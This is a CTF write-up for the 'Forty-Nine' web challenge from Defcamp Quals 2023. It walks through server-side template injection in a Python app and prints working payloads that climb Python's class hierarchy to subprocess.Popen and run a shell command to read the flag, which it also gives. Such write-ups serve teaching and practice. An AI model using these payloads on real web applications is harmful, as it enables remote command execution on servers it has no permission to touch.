---
title: Forty-Nine
date: 2023-10-22T14:55:41-04:00
description: Writeup for Forty-Nine [Defcamp Quals 2023]
type: writeup
author: Koyossu
tags:
- web
draft: false
---
___

## Challenge Description

We have a random fact generator that might have some problems sanitizing the input. It may not be as simple as 7*7.

Flag format: CTF{sha256}

## Intuition

Having seen the funny description we know that this is yet another jail escape. Let's look at the main page and see what all the fuss is about.

![img.png](/images/defcamp_quals_2023/fortyNine1.png)

So we can understand the following: the web page takes our input and that the server is in python. Lovely stuff.

From here we can try to do SSTI using one of the 2 python template escapes, the `{{` (curly brackets) or `{% %}`

After some tries we see this.

![img.png](/images/defcamp_quals_2023/fortyNine2.png)

Bingo! We now know this is for sure SSTI and all we have to do is call system and get the flag from the machine. Hopefully, the challange did not have any input sanitization or restrictions.

## Solution

All we needed to do is reach __builtins__ or something that has any function related to system calls and shell spawning. We will go step by step using common techniques, like 
leveraging python objects and MRO (method resolution order), trying to access the above mentioned methods.

Let the fun begin :)

Using a basic technique 
```python
{% print( ''.__class__.__mro__[1].__subclasses__()) %}
```
![img.png](/images/defcamp_quals_2023/fortyNine3.png)

Bingo, we have access to `<class 'subprocess.Popen'>` in this array, so we can call popen and do cat the flag. 

Final Payload:
```python
{% print( ''.__class__.__mro__[1].__subclasses__()[367]("cat flag.txt", shell=True, stdout=-1).communicate()) %}
```
![img.png](/images/defcamp_quals_2023/fortyNine4.png)


### Flag
Here is the final flag, and a proof from the website :)

![img.png](/images/defcamp_quals_2023/fortyNineFlag.png)

`CTF{f1cb7344129bcc51480407f1f381cb994c155194fdde34b827cc48c9f4d3040e}`

